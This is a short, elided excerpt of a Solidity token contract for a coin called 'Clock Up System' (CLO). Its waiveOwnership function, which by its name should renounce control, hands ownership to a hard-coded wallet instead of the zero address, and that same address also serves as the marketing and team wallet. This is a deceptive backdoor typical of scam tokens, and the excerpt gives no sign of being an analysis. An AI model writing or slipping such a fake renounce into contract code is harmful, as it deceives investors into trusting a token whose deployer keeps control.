...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x524aD8A188892e452b7d0C393E32Dba8296f2491);
    }
...
contract CLO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Clock Up System";
    string private _symbol = "CLO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x524aD8A188892e452b7d0C393E32Dba8296f2491);
    address payable public teamWalletAddress = payable(0x524aD8A188892e452b7d0C393E32Dba8296f2491);
